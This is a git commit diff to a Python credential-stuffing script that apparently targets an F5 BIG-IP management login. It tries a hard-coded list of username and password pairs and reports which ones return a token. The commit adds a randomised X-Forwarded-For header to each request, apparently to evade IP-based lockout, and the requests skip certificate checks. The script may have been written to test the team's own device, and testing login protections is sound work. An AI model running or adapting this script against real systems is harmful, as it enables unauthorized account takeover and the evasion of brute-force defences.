e09ac346a0c5431e682baf187fa687c2f7d9be62
yossi-r <yossi.ros@gmail.com>
2017-10-12 18:59:53 +0000

    added ip random

--- roles/operations/templates/credStuffTest.py
+++ roles/operations/templates/credStuffTest.py
@@ -4,6 +4,7 @@ import collections
 import sys
 import argparse
 import time
+import random
 parser = argparse.ArgumentParser(description="get variables")
 parser.add_argument("x", type= str, default='10.128.10.44', help="bigip_mgmt_vip_ip")
 parser.add_argument("y", type= str, default='admin', help="username")
@@ -24,14 +25,16 @@ credDict['aaron'] = 'sasdffdsa'
 credDict['administrator'] = 'supderpass'
 credDict[args.y] = args.z
 for key, value in credDict.iteritems():
-        payload = "{\n  \"username\": " + key +",\n  \"password\": " + value + ",\n  \"loginProvidername\":\"tmos\"\n}\n"
-        headers = {
-                'content-type': "application/json",
-                'cache-control': "no-cache",
-                }
-        response = requests.request("POST", url, data=payload, headers=headers, verify=False)
-        if "token" in response.text:
-            print("Success, found valid credentials:" + "\nusername: " + key + " password: " + value)
-        else:
-                print("Authentication failed for user: " + key)
+ ip = ".".join(map(str, (random.randint(0, 255) for _ in range(4))))
+ payload = "{\n  \"username\": " + key +",\n  \"password\": " + value + ",\n  \"loginProvidername\":\"tmos\"\n}\n"
+ headers = {
+  'content-type': "application/json",
+  'cache-control': "no-cache",
+  'X-Forwarded-For': ip,
+  }
+ response = requests.request("POST", url, data=payload, headers=headers, verify=False)
+ if "token" in response.text:
+     print("Success, found valid credentials:" + "\nusername: " + key + " password: " + value)
+ else:
+  print("Authentication failed for user: " + key)
 print("finished script")
